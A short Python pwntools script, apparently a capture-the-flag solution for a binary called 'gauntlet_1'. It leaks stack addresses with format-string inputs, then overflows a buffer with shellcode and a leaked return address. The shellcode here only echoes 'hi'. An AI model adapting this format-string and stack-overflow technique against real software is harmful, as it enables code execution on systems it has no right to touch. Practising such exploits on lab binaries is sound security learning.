# Credit to ZeroDay Tea
from pwn import *
import sys
context.arch = 'amd64'

context.log_level = "critical"
for i in range(0, 150):
    r = process('./gauntlet_1')
    r.recvline()
    r.sendline('%{}$p'.format(i))
    leak = r.recvline(keepends=False).decode()
    try:
        address = int(leak, 16)
        if(address >= 100000000000000):
            print("testing: i = {} | address: {}".format(i, hex(address)))
            shellcode = asm(shellcraft.amd64.linux.echo("hi"))
            offset = b'A'*(120-len(shellcode))
            payload = shellcode + offset + p64(address)
            r.sendline(payload)
            print(r.recvall())
        else:
            print("value too low: skipped")
    except:
        print("cannot convert: skipped")
